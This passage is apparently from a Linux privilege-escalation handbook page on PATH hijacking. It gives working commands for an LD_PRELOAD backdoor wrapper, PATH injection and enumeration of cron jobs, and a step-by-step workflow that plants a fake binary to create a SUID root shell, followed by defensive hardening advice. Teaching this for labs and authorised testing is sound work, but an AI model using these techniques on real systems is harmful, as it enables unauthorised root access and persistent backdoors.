+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/rm
+
+<span class="c1"># If /tmp is in PATH before alias definition, it executes</span>
+</code></pre></div>
+<hr/>
+<h4 id="c-ld-preload-path-combo">C. LD_PRELOAD + PATH Combo<a aria-label="Link to this section" class="g-anchor" href="#c-ld-preload-path-combo">#</a></h4>
+<p>Combining PATH hijacking with LD_PRELOAD for persistent backdoors.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious library</span>
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>/tmp/libbackdoor.so<span class="w"> </span>backdoor.c
+
+<span class="c1"># 2. Create wrapper script in writable PATH</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/ls<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">export LD_PRELOAD=/tmp/libbackdoor.so</span>
+<span class="s">/bin/ls "$@"</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/ls
+
+<span class="c1"># 3. When root uses ls, LD_PRELOAD loads malicious library</span>
+</code></pre></div>
+<hr/>
+<h4 id="d-bypassing-a-restricted-path">D. Bypassing a Restricted PATH<a aria-label="Link to this section" class="g-anchor" href="#d-bypassing-a-restricted-path">#</a></h4>
+<p>Sometimes cron uses a restricted PATH but scripts can modify it.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Script starts with:</span>
+<span class="nv">PATH</span><span class="o">=</span>/usr/bin:/bin
+
+<span class="c1"># But then does:</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/tmp
+
+<span class="c1"># If /tmp is in the expanded PATH, exploit works</span>
+<span class="c1"># Inject at the END:</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/tmp<span class="w">  </span><span class="c1"># Least priority, only works if command not found elsewhere</span>
+
+<span class="c1"># Better to inject at START:</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</code></pre></div>
+<hr/>
+<h3 id="5-practical-attack-workflow">5. Practical Attack Workflow<a aria-label="Link to this section" class="g-anchor" href="#5-practical-attack-workflow">#</a></h3>
+<p><strong>Step 1: Enumerate PATH and Writable Directories</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== Current PATH ==="</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">'\n'</span>
+
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n=== Writable PATH Directories ==="</span>
+<span class="k">for</span><span class="w"> </span>dir<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">' '</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[+] Writable: </span><span class="nv">$dir</span><span class="s2">"</span>
+<span class="w">        </span><span class="c1"># Check what's already there</span>
+<span class="w">        </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-10
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n=== Writable Directories (not in PATH) ==="</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-writable<span class="w"> </span>!<span class="w"> </span>-path<span class="w"> </span><span class="s2">"/proc/*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+</code></pre></div>
+<p><strong>Step 2: Identify Root Processes/Commands Without Full Paths</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check cron jobs</span>
+cat<span class="w"> </span>/etc/crontab<span class="w"> </span>/etc/cron.d/*<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^#'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^$'</span>
+
+<span class="c1"># Check init scripts</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">" [a-z]"</span><span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+
+<span class="c1"># Check systemd service files</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"Exec"</span><span class="w"> </span>/etc/systemd/system/*.service<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/"</span>
+
+<span class="c1"># Check user scripts</span>
+find<span class="w"> </span>/home<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sh"</span><span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-l<span class="w"> </span><span class="s2">" [a-z]"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Step 3: Determine Which Commands Can Be Hijacked</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Extract all potential command names from cron</span>
+<span class="k">for</span><span class="w"> </span>file<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/crontab<span class="w"> </span>/etc/cron.d/*<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^#'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$file</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^$'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $NF}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'/'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="c1"># Extract from scripts</span>
+<span class="k">for</span><span class="w"> </span>script<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>find<span class="w"> </span>/etc/cron*<span class="w"> </span>-type<span class="w"> </span>f<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"(^|[^/])[a-zA-Z0-9_-]+"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$script</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"^#"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+<span class="k">done</span>
+</code></pre></div>
+<p><strong>Step 4: Create Malicious Binary</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># In the highest-priority writable PATH directory</span>
+<span class="nv">TARGET</span><span class="o">=</span><span class="s2">"/usr/local/bin/backup"</span><span class="w">  </span><span class="c1"># Example target</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1"># Backdoor payload</span>
+<span class="s1">cp /bin/bash /tmp/shell</span>
+<span class="s1">chmod +s /tmp/shell</span>
+<span class="s1">chown root:root /tmp/shell</span>
+<span class="s1"># Execute real command to maintain functionality</span>
+<span class="s1">/usr/bin/backup "$@"'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$TARGET</span><span class="s2">"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$TARGET</span><span class="s2">"</span>
+</code></pre></div>
+<p><strong>Step 5: Trigger Execution</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Wait for cron</span>
+<span class="c1"># Or trigger manually if possible</span>
+sudo<span class="w"> </span>/path/to/script<span class="w">  </span><span class="c1"># If you have sudo</span>
+<span class="c1"># Or restart service</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>service_name
+<span class="c1"># Or wait for system boot</span>
+</code></pre></div>
+<p><strong>Step 6: Verify</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">ls<span class="w"> </span>-la<span class="w"> </span>/tmp/shell
+<span class="c1"># -rwsr-sr-x 1 root root ... /tmp/shell</span>
+
+/tmp/shell<span class="w"> </span>-p
+<span class="c1"># root shell</span>
+</code></pre></div>
+<hr/>
+<h3 id="6-exploitable-scenarios">6. Exploitable Scenarios<a aria-label="Link to this section" class="g-anchor" href="#6-exploitable-scenarios">#</a></h3>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Exploit Method</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Writable /usr/local/bin</td>
+<td>Place binary in /usr/local/bin</td>
+<td>Cron calls <code>backup</code> → executes <code>/usr/local/bin/backup</code></td>
+</tr>
+<tr>
+<td>Cron PATH includes /tmp</td>
+<td>Place binary in /tmp</td>
+<td>If cron PATH: <code>PATH=/tmp:/bin</code> → hijack</td>
+</tr>
+<tr>
+<td>User .bashrc PATH modification</td>
+<td>Add /tmp to PATH before root su</td>
+<td>Root <code>su - user</code> → executes malicious commands</td>
+</tr>
+<tr>
+<td>SUID binary uses system()</td>
+<td>Create command in writable PATH</td>
+<td><code>system("ls")</code> executes malicious ls</td>
+</tr>
+<tr>
+<td>Script uses <code>source</code> without path</td>
+<td>Create sourced file in PATH</td>
+<td><code>. config.sh</code> loads malicious config</td>
+</tr>
+<tr>
+<td>Script modifies PATH</td>
+<td>Inject before existing PATH</td>
+<td><code>PATH=/tmp:$PATH</code> → /tmp takes priority</td>
+</tr>
+<tr>
+<td>Symlink attack</td>
+<td>Symlink to writable directory</td>
+<td><code>/usr/local/bin</code> → <code>/tmp/fake_bin</code></td>
+</tr>
+</tbody>
+</table></div>
+<hr/>
+<h3 id="7-defensive-measures">7. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#7-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Use Absolute Paths in Scripts</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Bad</span>
+backup_script
+
+<span class="c1"># Good</span>
+/usr/local/bin/backup_script
+/bin/cp<span class="w"> </span>/source<span class="w"> </span>/dest
+/usr/bin/tar<span class="w"> </span>-czf<span class="w"> </span>backup.tar.gz<span class="w"> </span>/data
+</code></pre></div>
+</li>
+<li>
+<p><strong>Restrict PATH Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Ensure PATH directories are not writable by non-root</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/usr/local/bin<span class="w"> </span>/usr/bin<span class="w"> </span>/bin<span class="w"> </span>/usr/sbin<span class="w"> </span>/sbin
+chown<span class="w"> </span>root:root<span class="w"> </span>/usr/local/bin<span class="w"> </span>/usr/bin<span class="w"> </span>/bin<span class="w"> </span>/usr/sbin<span class="w"> </span>/sbin
+</code></pre></div>
+</li>
+<li>
+<p><strong>Set Explicit PATH in Cron</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># /etc/crontab</span>
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<span class="c1"># Use only system directories</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use <code>--</code> to End Options</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Prevents arguments from being interpreted as options</span>
+tar<span class="w"> </span>-czf<span class="w"> </span>backup.tar.gz<span class="w"> </span>--<span class="w"> </span>/var/www/*
+</code></pre></div>
+</li>
+<li>
+<p><strong>Sanitize PATH in SUID Binaries</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># In C/C++: Use absolute paths for system() calls</span>
+system<span class="o">(</span><span class="s2">"/bin/ls -la /tmp"</span><span class="o">)</span><span class="p">;</span><span class="w">  </span><span class="c1"># Instead of system("ls -la /tmp");</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Disable Writable Directories in PATH</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Remove user-writable directories from system PATH</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/tmp"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/home"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="s1">':'</span><span class="k">)</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use AppArmor/SELinux</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Restrict which binaries can be executed</span>
+<span class="c1"># AppArmor profile for cron</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Regular Audits</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check for writable PATH directories daily</span>
+<span class="k">for</span><span class="w"> </span>dir<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">' '</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"ALERT: Writable PATH: </span><span class="nv">$dir</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="c1"># Check for missing absolute paths in scripts</span>
+find<span class="w"> </span>/etc/cron*<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>grep<span class="w"> </span>-H<span class="w"> </span><span class="s2">" [a-z]"</span><span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/"</span>
+</code></pre></div>
+</li>
+</ol>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 06 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/05-writable-system-files.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 05</span><strong>Writable System Files</strong></a><a class="g-chapter-card" href="../privesc/07-environment-variable-abuse.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 07</span><strong>Environment Variable Abuse</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#path-hijacking-for-privilege-escalation" data-toc-link>PATH Hijacking for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-path" data-toc-link>1. Understanding PATH</a><a class="g-toc-link depth-3" href="#2-enumeration-identifying-path-hijacking-opportunities" data-toc-link>2. Enumeration: Identifying PATH Hijacking Opportunities</a><a class="g-toc-link depth-3" href="#3-exploitation-techniques" data-toc-link>3. Exploitation Techniques</a><a class="g-toc-link depth-3" href="#4-advanced-techniques" data-toc-link>4. Advanced Techniques</a><a class="g-toc-link depth-3" href="#5-practical-attack-workflow" data-toc-link>5. Practical Attack Workflow</a><a class="g-toc-link depth-3" href="#6-exploitable-scenarios" data-toc-link>6. Exploitable Scenarios</a><a class="g-toc-link depth-3" href="#7-defensive-measures" data-toc-link>7. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 06 / 8 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
